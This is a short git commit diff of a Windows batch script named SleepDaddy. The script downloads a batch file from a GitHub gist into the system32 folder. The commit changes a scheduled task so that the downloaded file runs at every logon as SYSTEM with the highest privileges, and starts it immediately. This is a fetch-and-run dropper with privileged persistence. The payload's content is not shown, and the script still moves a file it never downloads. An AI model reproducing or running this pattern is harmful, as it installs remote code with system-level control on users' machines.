752f4076103c40438014642e530e926354e8cac5
INeedHelp <leonardo.bartolelli@gmail.com>
2023-02-14 19:13:41 +0100

    SleepDaddy

--- SleppDaddy/index.bat
+++ SleppDaddy/index.bat
@@ -3,5 +3,5 @@
 cd /d %windir%\system32
 powershell -Command "& { Invoke-WebRequest -Uri 'https://gist.github.com/INeddHelp/71d5cef5935055810bf338f97c3e8605/raw/sleepdaddy.bat' -OutFile 'sleepdaddy.bat' }"
 move /y checkpc.bat %windir%\System32\
-schtasks /create /tn "Run index.bat at logon" /tr "%windir%\System32\checkpc.bat" /sc ONLOGON /rl highest /ru System /f
-start checkpc.bat
+schtasks /create /tn "Run index.bat at logon" /tr "%windir%\System32\sleepdaddy.bat" /sc ONLOGON /rl highest /ru System /f
+start sleepdaddy.bat
